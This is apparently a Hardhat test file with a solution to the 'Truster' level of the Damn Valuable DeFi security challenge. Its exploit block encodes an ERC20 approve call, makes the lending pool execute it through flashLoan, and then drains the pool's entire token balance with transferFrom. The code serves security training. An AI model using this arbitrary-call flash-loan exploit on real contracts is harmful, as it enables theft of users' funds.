const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });


    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        /**
         * SOLUTION 1 (NEEDS TWO TRANSACTIONS)
         */
        let abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
        let iface = new ethers.utils.Interface(abi);
        let msgData = iface.encodeFunctionData("approve",[attacker.address,TOKENS_IN_POOL])
        // let msgData = this.token.approve.encode(
        //     [attacker.address,TOKENS_IN_POOL])

        await this.pool.connect(attacker).flashLoan(
            ethers.utils.parseEther('1'), //amount to borrow (doesn't really matter)
            this.pool.address, //borrower,
            this.token.address, //target
            msgData //function call
        )

        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address,TOKENS_IN_POOL);
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

